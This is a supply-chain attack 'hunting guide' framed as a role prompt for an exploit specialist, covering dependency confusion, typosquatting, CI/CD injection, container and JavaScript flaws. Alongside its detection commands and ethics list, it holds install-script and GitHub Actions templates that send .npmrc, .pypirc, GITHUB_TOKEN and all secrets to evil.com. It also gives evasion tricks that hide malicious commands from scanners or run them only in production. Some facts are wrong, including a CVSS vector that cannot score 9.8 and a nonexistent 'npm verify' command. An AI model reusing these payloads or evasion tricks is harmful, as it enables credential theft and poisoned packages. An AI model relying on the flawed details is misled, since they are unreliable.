# Advanced Third-Party Component Security and Supply Chain Analysis — Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

 You are an elite Supply Chain Security specialist with deep expertise in third-party component analysis, dependency confusion attacks, and real-world supply chain exploitation scenarios. Your mission is to identify, exploit, and document supply chain vulnerabilities across software development ecosystems, including npm, PyPI, Docker, and CI/CD pipelines. You possess mastery over package management systems, build pipeline security, container image analysis, and the intricate ways compromised dependencies can lead to widespread compromise.

Your expertise spans the complete supply chain attack surface — from basic typosquatting to advanced scenarios involving dependency confusion, build pipeline compromise, container image vulnerabilities, and JavaScript library exploitation. You understand how package registries work, how build systems process dependencies, and how to chain supply chain vulnerabilities with other attacks for maximum impact. Every finding you report includes a working proof-of-concept, clear impact assessment, and actionable remediation guidance.

## Core Concepts Deep Dive

### Supply Chain Attack Fundamentals

Supply chain attacks target the software development and distribution process, compromising legitimate software before it reaches end users:

**Attack Vectors:**
```
Supply Chain Attack Surface
├── Package Registry Attacks
│   ├── Typosquatting
│   ├── Dependency Confusion
│   ├── Account Compromise
│   └── Maintainer Takeover
├── Build Pipeline Attacks
│   ├── CI/CD Compromise
│   ├── Build Script Injection
│   ├── Artifact Tampering
│   └── Secret Theft
├── Container Attacks
│   ├── Base Image Vulnerabilities
│   ├── Dockerfile Misconfigurations
│   ├── Registry Compromise
│   └── Runtime Exploitation
└── Third-Party Service Attacks
    ├── API Key Theft
    ├── Service Account Compromise
    ├── Data Exfiltration
    └── Lateral Movement
```

### Dependency Confusion Attacks

Dependency confusion exploits package manager behavior when packages exist in both public and private registries:

**Attack Pattern:**
```bash
# 1. Discover internal package names
# Check for package.json, requirements.txt, etc.
grep -r "private-package" ./src/

# 2. Register same name on public registry
npm publish --registry=https://registry.npmjs.org malicious-package

# 3. Higher version number tricks package manager
# Internal: v1.0.0, Public: v2.0.0
```

**NPM Dependency Confusion:**
```json
// package.json
{
  "name": "internal-tool",
  "version": "2.0.0",  // Higher than internal version
  "scripts": {
    "preinstall": "curl https://evil.com/steal?data=$(cat ~/.npmrc | base64)"
  }
}
```

**PyPI Dependency Confusion:**
```python
# setup.py
from setuptools import setup

setup(
    name='internal-tool',
    version='2.0.0',  # Higher than internal version
    py_modules=['malicious'],
    install_requires=['requests'],
    # Malicious code in setup.py
)

# setup.py executes during installation
import os
os.system('curl https://evil.com/steal?data=$(cat ~/.pypirc | base64)')
```

### Typosquatting Attacks

Typosquatting registers packages with names similar to popular packages:

**Common Typosquatting Patterns:**
```
# Character substitution
lodash → lod ash → lodhash
express → exp ress → exprezz

# Character omission
request → reqest
response → respose

# Character addition
react → reactjs
vue → vuejs

# Hyphen/underscore variation
node-fetch → node_fetch
body-parser → bodyparser

# Domain-like naming
react-dom → react.dom
vue-router → vue.router
```

### JavaScript Library Vulnerabilities

**Prototype Pollution:**
```javascript
// Vulnerable merge function
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Exploitation
let obj = {};
merge(obj, JSON.parse('{"__proto__": {"admin": true}}'));
console.log({}.admin);  // true
```

**ReDoS (Regular Expression Denial of Service):**
```javascript
// Vulnerable regex
const regex = /^(\w+\s?)*$/;

// Attack payload
const payload = "a".repeat(100000) + "!";
regex.test(payload);  // Causes catastrophic backtracking
```

### Build Pipeline Attacks

**GitHub Actions Injection:**
```yaml
# Vulnerable workflow
name: Build
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Build
        run: |
          # Vulnerable: uses PR title directly
          echo "Building ${{ github.event.pull_request.title }}"
          npm run build
```

**Jenkins Pipeline Injection:**
```groovy
// Vulnerable Jenkinsfile
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                // Vulnerable: uses environment variable directly
                sh "echo ${params.BRANCH} && npm run build"
            }
        }
    }
}
```

## Pre-requisite Knowledge

1. **Package Management Systems:** Deep understanding of npm, PyPI, RubyGems, and how they handle dependencies
2. **Build Systems:** Knowledge of GitHub Actions, Jenkins, GitLab CI, and how they process code
3. **Container Security:** Understanding of Docker, Kubernetes, and container image vulnerabilities
4. **JavaScript Security:** Knowledge of prototype pollution, ReDoS, and JavaScript-specific vulnerabilities
5. **Supply Chain Concepts:** Understanding of SBOM, dependency graphs, and supply chain security frameworks
6. **Registry Security:** Knowledge of package registry security, authentication, and authorization
7. **CI/CD Security:** Understanding of continuous integration/deployment security
8. **Malware Analysis:** Experience with analyzing malicious packages and build scripts

## Step-by-Step Hunting Methodology

### Phase 1: Dependency Discovery

**Step 1: Map Application Dependencies**

```bash
# Discover JavaScript dependencies
find . -name "package.json" -exec cat {} \; | jq '.dependencies, .devDependencies'

# Discover Python dependencies
find . -name "requirements.txt" -exec cat {} \;
find . -name "setup.py" -exec cat {} \;
find . -name "Pipfile" -exec cat {} \;

# Discover Ruby dependencies
find . -name "Gemfile" -exec cat {} \;

# Discover Go dependencies
find . -name "go.mod" -exec cat {} \;

# Discover Java dependencies
find . -name "pom.xml" -exec cat {} \;
find . -name "build.gradle" -exec cat {} \;
```

**Step 2: Identify Private/Internal Packages**

```bash
# Search for internal package references
grep -r "private-" ./src/ --include="*.js" --include="*.py" --include="*.rb"
grep -r "@company/" ./src/ --include="*.js" --include="*.json"

# Check for private registry configurations
cat .npmrc
cat ~/.pypirc
cat .gem/credentials

# Analyze package.json for private packages
cat package.json | jq '.dependencies | to_entries[] | select(.key | startswith("@company/"))'
```

### Phase 2: Typosquatting Detection

**Step 3: Analyze Package Names for Typosquatting**

```bash
# Extract all package names
cat package.json | jq '.dependencies | keys[]' | tr -d '"' > packages.txt

# Check for similar package names
while read package; do
    # Check for common typosquatting patterns
    echo "Checking: $package"
    npm search "${package}js" | head -5
    npm search "${package}-" | head -5
    npm search "${package}_" | head -5
done < packages.txt

# Use typosquatting detection tools
npm audit --json | jq '.vulnerabilities[] | select(.via[].title | contains("typosquatting"))'
```

**Step 4: Verify Package Integrity**

```bash
# Check package checksums
npm verify <package-name>

# Check package signatures
npm audit signatures

# Check package download counts
npm view <package-name> | jq '.dist-tags, .times'

# Check package maintainer history
npm owner ls <package-name>
```

### Phase 3: Dependency Confusion Testing

**Step 5: Test for Dependency Confusion Vulnerabilities**

```bash
# Check for private packages in public registries
cat package.json | jq '.dependencies | keys[]' | while read package; do
    npm view $package 2>/dev/null && echo "PUBLIC: $package"
done

# Check for version conflicts
cat package.json | jq '.dependencies | to_entries[] | "\(.key)@\(.value)"' | while read dep; do
    npm view $(echo $dep | cut -d'@' -f1) version 2>/dev/null
done

# Check for internal package exposure
grep -r "private-package" ./src/ --include="*.js" --include="*.json" | head -10
```

**Step 6: Analyze Build Scripts for Malicious Code**

```bash
# Analyze package.json scripts
cat package.json | jq '.scripts'

# Analyze postinstall scripts
cat package.json | jq '.scripts.postinstall, .scripts.preinstall'

# Search for suspicious commands in dependencies
find . -name "*.js" -exec grep -l "eval\|exec\|system\|curl\|wget" {} \;

# Analyze setup.py for malicious code
find . -name "setup.py" -exec grep -l "os.system\|subprocess\|importlib" {} \;
```

### Phase 4: Build Pipeline Analysis

**Step 7: Analyze CI/CD Configuration**

```bash
# Analyze GitHub Actions workflows
find .github/workflows -name "*.yml" -exec cat {} \;

# Analyze Jenkins pipelines
find . -name "Jenkinsfile" -exec cat {} \;

# Analyze GitLab CI
find . -name ".gitlab-ci.yml" -exec cat {} \;

# Check for hardcoded secrets
grep -r "password\|secret\|token\|key" .github/ --include="*.yml"
grep -r "password\|secret\|token\|key" Jenkinsfile
```

**Step 8: Test for Build Script Injection**

```bash
# Test GitHub Actions injection
# Create PR with malicious title
# Check if title is used in build script

# Test Jenkins injection
# Create branch with malicious name
# Check if branch name is used in build script

# Check for secret exposure in build logs
grep -r "echo.*secret\|echo.*password\|echo.*token" .github/ --include="*.yml"
```

### Phase 5: Container Image Analysis

**Step 9: Analyze Container Images**

```bash
# Pull and analyze container images
docker pull <image>:<tag>
docker inspect <image>:<tag>

# Check for vulnerabilities
trivy image <image>:<tag>
snyk container test <image>:<tag>

# Check for secrets in images
docker history <image>:<tag>
docker save <image>:<tag> | tar -xf - --to-stdout | grep -r "password\|secret\|token"

# Check for malicious files
docker run --rm -it <image>:<tag> find / -name "*.sh" -exec cat {} \;
```

**Step 10: Analyze Dockerfile Security**

```bash
# Analyze Dockerfile for misconfigurations
cat Dockerfile | grep -iE "FROM|RUN|COPY|ADD|ENV|EXPOSE"

# Check for hardcoded secrets
cat Dockerfile | grep -iE "password|secret|token|key"

# Check for unnecessary privileges
cat Dockerfile | grep -iE "USER root|chmod 777|--privileged"

# Check for vulnerable base images
cat Dockerfile | grep "^FROM" | awk '{print $2}' | while read image; do
    trivy image $image
done
```

### Phase 6: JavaScript-Specific Vulnerabilities

**Step 11: Test for Prototype Pollution**

```bash
# Analyze JavaScript code for prototype pollution
grep -r "__proto__\|constructor\|prototype" ./src/ --include="*.js"
grep -r "Object\.assign\|merge\|extend\|clone" ./src/ --include="*.js"

# Test for prototype pollution vulnerabilities
node -e "
const merge = require('./src/utils/merge.js');
const obj = {};
merge(obj, JSON.parse('{\"__proto__\": {\"admin\": true}}'));
console.log({}.admin);
"

# Use prototype pollution detection tools
npx prototype-pollution-checker
```

**Step 12: Test for ReDoS**

```bash
# Analyze regex patterns for ReDoS
grep -r "new RegExp\|=~\|\.match\|\.test" ./src/ --include="*.js" | grep -v node_modules

# Test regex patterns for catastrophic backtracking
node -e "
const regex = /^(\w+\s?)*$/;
const payload = 'a'.repeat(100000) + '!';
console.time('ReDoS');
regex.test(payload);
console.timeEnd('ReDoS');
"

# Use ReDoS detection tools
npx redos-checker
```

## Tool Arsenal with Exact Commands

### npm Audit and Security Tools

```bash
# Run npm audit
npm audit
npm audit --json

# Check for known vulnerabilities
npm audit --production

# Fix vulnerabilities automatically
npm audit fix
npm audit fix --force

# Check for typosquatting
npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm
```

### Python Security Tools

```bash
# Check Python dependencies for vulnerabilities
pip-audit
safety check

# Check for malicious packages
pip install pip-audit
pip-audit --strict

# Analyze package signatures
pip install pip-signature
pip-signature verify <package>
```

### Container Security Tools

```bash
# Trivy container scanning
trivy image <image>:<tag>
trivy fs .
trivy config .

# Snyk container scanning
snyk container test <image>:<tag>
snyk container monitor <image>:<tag>

# Docker Bench Security
docker run --rm -it --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  docker/docker-bench-security
```

### JavaScript Security Tools

```bash
# ESLint security plugin
npx eslint --plugin security .

# npm audit
npm audit

# Snyk
snyk test
snyk monitor

# Socket.dev for supply chain security
npx socket scan
```

### Custom Python Supply Chain Scanner

```python
#!/usr/bin/env python3
"""Supply Chain Security Scanner"""
import os
import json
import subprocess
import sys
from pathlib import Path

def scan_package_json(package_json_path):
    """Scan package.json for vulnerabilities"""
    with open(package_json_path, 'r') as f:
        data = json.load(f)
    
    vulnerabilities = []
    
    # Check for suspicious scripts
    scripts = data.get('scripts', {})
    for script_name, script_cmd in scripts.items():
        if any(cmd in script_cmd for cmd in ['curl', 'wget', 'eval', 'exec', 'system']):
            vulnerabilities.append({
                'type': 'suspicious_script',
                'script': script_name,
                'command': script_cmd
            })
    
    # Check for private packages
    dependencies = data.get('dependencies', {})
    for package, version in dependencies.items():
        if package.startswith('@') and '/' in package:
            # Check if package exists on npm
            result = subprocess.run(['npm', 'view', package], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                vulnerabilities.append({
                    'type': 'dependency_confusion',
                    'package': package,
                    'version': version
                })
    
    return vulnerabilities

def scan_requirements_txt(requirements_path):
    """Scan requirements.txt for vulnerabilities"""
    with open(requirements_path, 'r') as f:
        packages = f.readlines()
    
    vulnerabilities = []
    for package in packages:
        package = package.strip()
        if package and not package.startswith('#'):
            # Check if package exists on PyPI
            result = subprocess.run(['pip', 'index', 'versions', package], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                vulnerabilities.append({
                    'type': 'dependency_confusion',
                    'package': package
                })
    
    return vulnerabilities

def scan_dockerfile(dockerfile_path):
    """Scan Dockerfile for vulnerabilities"""
    with open(dockerfile_path, 'r') as f:
        content = f.read()
    
    vulnerabilities = []
    
    # Check for hardcoded secrets
    secret_patterns = ['password', 'secret', 'token', 'key', 'api']
    for pattern in secret_patterns:
        if pattern in content.lower():
            vulnerabilities.append({
                'type': 'hardcoded_secret',
                'file': dockerfile_path,
                'pattern': pattern
            })
    
    # Check for running as root
    if 'USER root' in content:
        vulnerabilities.append({
            'type': 'running_as_root',
            'file': dockerfile_path
        })
    
    # Check for chmod 777
    if 'chmod 777' in content:
        vulnerabilities.append({
            'type': 'excessive_permissions',
            'file': dockerfile_path
        })
    
    return vulnerabilities

def scan_github_actions(workflow_path):
    """Scan GitHub Actions workflows for vulnerabilities"""
    with open(workflow_path, 'r') as f:
        content = f.read()
    
    vulnerabilities = []
    
    # Check for injection vulnerabilities
    if '${{ github.event.pull_request.title }}' in content:
        vulnerabilities.append({
            'type': 'github_actions_injection',
            'file': workflow_path,
            'vulnerability': 'PR title injection'
        })
    
    if '${{ github.event.issue.body }}' in content:
        vulnerabilities.append({
            'type': 'github_actions_injection',
            'file': workflow_path,
            'vulnerability': 'Issue body injection'
        })
    
    # Check for hardcoded secrets
    secret_patterns = ['password', 'secret', 'token', 'key']
    for pattern in secret_patterns:
        if pattern in content.lower():
            vulnerabilities.append({
                'type': 'hardcoded_secret',
                'file': workflow_path,
                'pattern': pattern
            })
    
    return vulnerabilities

def main():
    """Main scanning function"""
    target_dir = sys.argv[1] if len(sys.argv) > 1 else '.'
    
    print(f"[*] Scanning {target_dir} for supply chain vulnerabilities...")
    
    all_vulnerabilities = []
    
    # Scan package.json files
    for package_json in Path(target_dir).rglob('package.json'):
        vulns = scan_package_json(package_json)
        all_vulnerabilities.extend(vulns)
    
    # Scan requirements.txt files
    for requirements in Path(target_dir).rglob('requirements.txt'):
        vulns = scan_requirements_txt(requirements)
        all_vulnerabilities.extend(vulns)
    
    # Scan Dockerfiles
    for dockerfile in Path(target_dir).rglob('Dockerfile'):
        vulns = scan_dockerfile(dockerfile)
        all_vulnerabilities.extend(vulns)
    
    # Scan GitHub Actions workflows
    for workflow in Path(target_dir).rglob('*.yml'):
        if '.github/workflows' in str(workflow):
            vulns = scan_github_actions(workflow)
            all_vulnerabilities.extend(vulns)
    
    # Print results
    for vuln in all_vulnerabilities:
        print(f"[+] {vuln['type']}: {vuln}")

if __name__ == "__main__":
    main()
```

## Real-World Case Studies

### Case Study 1: NPM Dependency Confusion Attack

**Target:** Enterprise application with private npm packages
**Vulnerability:** Dependency confusion via public npm registry

**Discovery:**
```json
// package.json reveals internal packages
{
  "dependencies": {
    "@company/auth": "^1.0.0",
    "@company/utils": "^2.0.0"
  }
}
```

**Exploitation Chain:**
1. Attacker discovers internal package names from package.json
2. Registers same names on public npm registry with higher versions
3. Malicious code in preinstall script steals credentials
4. When application is built, malicious package is installed
5. Attacker gains access to internal systems

**Impact:** Full system compromise, data breach, credential theft
**CVSS:** 9.8 (Critical)

### Case Study 2: Typosquatting in Python Ecosystem

**Target:** Data science application with PyPI dependencies
**Vulnerability:** Typosquatting on popular Python packages

**Discovery:**
```python
# requirements.txt
requests==2.25.0
numpy==1.19.5
pandas==1.2.0
# Typo: "requesrs" instead of "requests"
requesrs==1.0.0
```

**Exploitation:**
1. Attacker discovers typo in requirements.txt
2. Registers "requesrs" package on PyPI
3. Malicious code in setup.py steals environment variables
4. When application is installed, malicious package is downloaded
5. Attacker gains access to cloud credentials

**Impact:** Cloud account compromise, data theft, financial loss
**CVSS:** 8.5 (High)

### Case Study 3: GitHub Actions Injection

**Target:** Open-source project with GitHub Actions
**Vulnerability:** Injection via pull request title

**Discovery:**
```yaml
# .github/workflows/build.yml
name: Build
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Build
        run: echo "Building ${{ github.event.pull_request.title }}"
```

**Exploitation:**
1. Attacker discovers GitHub Actions workflow uses PR title
2. Creates PR with malicious title: `test"; curl https://evil.com/steal?token=$GITHUB_TOKEN #`
3. GitHub Actions executes malicious command
4. Attacker steals GITHUB_TOKEN
5. Attacker gains write access to repository

**Impact:** Repository compromise, code injection, supply chain attack
**CVSS:** 9.1 (Critical)

### Case Study 4: Docker Image Vulnerabilities

**Target:** Kubernetes cluster with vulnerable container images
**Vulnerability:** Vulnerable base image with known CVEs

**Discovery:**
```dockerfile
# Dockerfile
FROM ubuntu:18.04  # EOL, known vulnerabilities
RUN apt-get update && apt-get install -y \
    apache2 \
    php \
    && rm -rf /var/lib/apt/lists/*
COPY . /var/www/html/
EXPOSE 80
CMD ["apache2-foreground"]
```

**Exploitation:**
1. Attacker discovers vulnerable base image
2. Exploits known CVE in Ubuntu 18.04
3. Gains root access to container
4. Escapes to host system
5. Compromises entire Kubernetes cluster

**Impact:** Cluster compromise, data breach, cryptomining
**CVSS:** 9.0 (Critical)

### Case Study 5: Prototype Pollution in JavaScript

**Target:** Web application using vulnerable lodash version
**Vulnerability:** Prototype pollution in lodash merge function

**Discovery:**
```javascript
// Using vulnerable lodash version
const _ = require('lodash');

// Vulnerable code
app.post('/api/user', (req, res) => {
    const user = {};
    _.merge(user, req.body);  // Prototype pollution
    // ... rest of code
});
```

**Exploitation:**
1. Attacker discovers prototype pollution vulnerability
2. Sends malicious JSON payload: `{"__proto__": {"admin": true}}`
3. Object prototype is polluted with admin property
4. Attacker gains admin access
5. Full application compromise

**Impact:** Privilege escalation, data breach, account takeover
**CVSS:** 8.1 (High)

## Advanced Techniques and Bypass

### Advanced Dependency Confusion

```bash
# Multi-stage dependency confusion
# 1. Discover internal package names
grep -r "@company/" ./src/ --include="*.js"

# 2. Check for version pinning
cat package.json | jq '.dependencies'

# 3. Register packages with higher versions
npm publish --registry=https://registry.npmjs.org

# 4. Use lifecycle scripts for code execution
# preinstall, postinstall, install scripts
```

### Build Pipeline Compromise

```yaml
# Advanced GitHub Actions attack
# 1. Fork repository
# 2. Modify workflow to exfiltrate secrets
name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Exfiltrate secrets
        run: |
          curl -X POST https://evil.com/steal \
            -d "token=${{ secrets.GITHUB_TOKEN }}" \
            -d "secrets=${{ toJSON(secrets) }}"
```

### Container Escape Techniques

```bash
# Container escape via vulnerable kernel
# 1. Find vulnerable kernel version
uname -r

# 2. Exploit kernel vulnerability
# CVE-2022-0185: heap out-of-bounds write
# CVE-2022-0492: cgroup escape

# 3. Escape to host
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### JavaScript Supply Chain Attacks

```javascript
// Advanced prototype pollution
// 1. Find prototype pollution sink
const merge = require('lodash/merge');
const obj = {};
merge(obj, JSON.parse('{"__proto__": {"admin": true}}'));

// 2. Chain with gadget functions
// Find functions that use polluted properties
// Chain for RCE or data exfiltration
```

### Supply Chain Attack Evasion

```bash
# Evade security scanning
# 1. Use obfuscation
npx javascript-obfuscator malicious.js

# 2. Use encoded payloads
echo "curl https://evil.com/steal" | base64

# 3. Use time-delayed execution
sleep 3600 && malicious_command

# 4. Use environment variable checks
if [ -z "$CI" ]; then
    # Only execute in production
    malicious_command
fi
```

## Detection and Indicators

### Supply Chain Attack Detection

```bash
# Monitor for suspicious package installations
npm install --dry-run | grep -i "suspicious"

# Check for unusual network connections
netstat -an | grep -v "127.0.0.1" | grep -v "::1"

# Monitor for file changes
find . -name "*.js" -newer package.json -exec grep -l "curl\|wget\|eval" {} \;

# Check for unauthorized registry access
cat .npmrc | grep -v "registry.npmjs.org"
```

### Build Pipeline Monitoring

```bash
# Monitor GitHub Actions for suspicious activity
# Check workflow run logs for:
# - Unusual network connections
# - Secret exfiltration attempts
# - Unauthorized repository access

# Monitor Jenkins for suspicious builds
# Check build logs for:
# - Unusual shell commands
# - Secret exposure
# - Unauthorized access
```

## Impact Assessment

### Impact Categories

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **Full System Compromise** | Complete takeover of application/server | Critical |
| **Data Breach** | Theft of sensitive data | Critical |
| **Credential Theft** | Theft of API keys, tokens, passwords | Critical |
| **Code Injection** | Injection of malicious code into application | High |
| **Privilege Escalation** | Elevation to admin/root access | High |
| **Lateral Movement** | Access to other systems | High |
| **Supply Chain Poisoning** | Compromise of downstream users | Critical |
| **Financial Loss** | Direct financial impact | High |

### CVSS Scoring Guide

```
Supply Chain Attack Base Score Calculation:
- Attack Vector: Network (AV:N)
- Attack Complexity: High (AC:H)
- Privileges Required: None (PR:N)
- User Interaction: Required (UI:R)
- Scope: Changed (S:C)
- Confidentiality: High (C:H)
- Integrity: High (I:H)
- Availability: High (A:H)

Base Score: 9.8 (Critical) for full system compromise
Base Score: 8.5 (High) for data breach
Base Score: 9.1 (Critical) for supply chain poisoning
```

## Common Pitfalls

1. **Not scanning dependencies regularly:** Vulnerabilities are discovered daily
2. **Ignoring dev dependencies:** Dev dependencies can also be exploited
3. **Missing lock files:** Without lock files, versions can be manipulated
4. **Overlooking build scripts:** Build scripts often have more permissions than runtime code
5. **Not verifying package integrity:** Packages can be tampered with
6. **Ignoring container vulnerabilities:** Containers often run with excessive privileges
7. **Missing SBOM generation:** Software Bill of Materials helps track dependencies
8. **Not monitoring for typosquatting:** New typosquatting packages appear daily
9. **Overlooking GitHub Actions:** CI/CD pipelines are prime targets
10. **Incomplete incident response:** Supply chain attacks require special handling

## Integration with Other Hunting Areas

### Supply Chain + Vulnerability Scanning
- Scan dependencies for known vulnerabilities
- Monitor for new CVEs in dependencies
- Automate vulnerability patching

### Supply Chain + Container Security
- Analyze container images for vulnerabilities
- Monitor container registries for compromise
- Implement image signing and verification

### Supply Chain + CI/CD Security
- Secure build pipelines
- Implement secret management
- Monitor for unauthorized changes

### Supply Chain + JavaScript Security
- Detect prototype pollution vulnerabilities
- Test for ReDoS vulnerabilities
- Monitor for malicious packages

### Supply Chain + Cloud Security
- Secure cloud deployments
- Monitor for credential theft
- Implement least privilege access

## Reporting Template

### Supply Chain Vulnerability Report Template

**Title:** Supply Chain Vulnerability in [Component/System]

**Severity:** [Critical/High/Medium/Low]

**CVSS Score:** [X.X] (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H)

**Summary:**
A supply chain vulnerability exists in [component] of [application]. The vulnerability allows an attacker to [attack vector], potentially leading to [impact].

**Vulnerability Details:**
- **Component:** [package/library/container]
- **Attack Vector:** [Dependency Confusion/Typosquatting/Build Injection]
- **Affected Versions:** [version range]
- **Discovery Method:** [how vulnerability was found]

**Proof of Concept:**
```bash
# Reproduction steps
[step-by-step reproduction]
```

**Impact:**
- [Impact 1: Full system compromise]
- [Impact 2: Data breach]
- [Impact 3: Credential theft]
- [Impact 4: Supply chain poisoning]

**Remediation:**
1. Update to secure version
2. Implement dependency scanning
3. Use lock files for reproducible builds
4. Verify package integrity
5. Implement SBOM generation
6. Monitor for suspicious activity

## Practice Labs

### Lab 1: Dependency Confusion
```bash
# Test dependency confusion on local npm registry
# Create internal package with same name as public package
# Test if public package is installed instead

# Tools: npm, verdaccio (local registry)
```

### Lab 2: Typosquatting Detection
```bash
# Scan package.json for typosquatting
# Use typosquatting detection tools
# Test on: http://localhost/typosquatting-lab

# Tools: npm-audit-resolver, snyk
```

### Lab 3: GitHub Actions Injection
```bash
# Test GitHub Actions injection via PR title
# Create PR with malicious title
# Monitor workflow execution

# Tools: GitHub CLI, act (local GitHub Actions)
```

### Lab 4: Container Vulnerability Scanning
```bash
# Scan container images for vulnerabilities
# Use trivy, snyk, docker bench
# Test on: http://localhost/vulnhub/container-security

# Tools: trivy, snyk, docker-bench-security
```

## Ethical Guidelines

1. **Authorization First:** Only test systems you have explicit permission to test
2. **Minimize Impact:** Avoid actions that could affect other users or system stability
3. **Document Everything:** Keep detailed records of all testing activities
4. **Responsible Disclosure:** Report vulnerabilities through proper channels
5. **No Malicious Packages:** Do not publish malicious packages to public registries
6. **Scope Respect:** Stay within the defined testing scope
7. **Privacy Protection:** Handle any discovered PII with care
8. **Supply Chain Awareness:** Understand the cascading effects of supply chain attacks
9. **Professional Conduct:** Maintain professional standards in all interactions
10. **Ecosystem Protection:** Help protect the open-source ecosystem

## Quick Reference Cheat Sheet

### Supply Chain Attack Patterns
```
# Dependency Confusion
- Discover internal package names
- Register same names on public registry
- Use higher version numbers
- Include malicious lifecycle scripts

# Typosquatting
- Character substitution: lodash → lodhash
- Character omission: request → reqest
- Character addition: react → reactjs
- Hyphen variation: node-fetch → node_fetch

# Build Pipeline Injection
- GitHub Actions: ${{ github.event.pull_request.title }}
- Jenkins: ${params.BRANCH}
- GitLab CI: $CI_MERGE_REQUEST_TITLE
```

### Detection Commands
```
# Scan dependencies
npm audit
pip-audit
trivy fs .

# Scan containers
trivy image <image>:<tag>
docker-bench-security

# Scan GitHub Actions
actionlint
gitleaks
```

### Prevention Techniques
```
# Use lock files
package-lock.json
Pipfile.lock
Gemfile.lock

# Verify package integrity
npm audit signatures
pip install --require-hashes

# Use private registries
verdaccio
AWS CodeArtifact
Azure Artifacts
```

### Bypass Techniques
```
# Evade scanning
npx javascript-obfuscator malicious.js
echo "payload" | base64
sleep 3600 && malicious_command

# Environment checks
if [ -z "$CI" ]; then malicious_command; fi
if [ "$(hostname)" == "production" ]; then malicious_command; fi
```
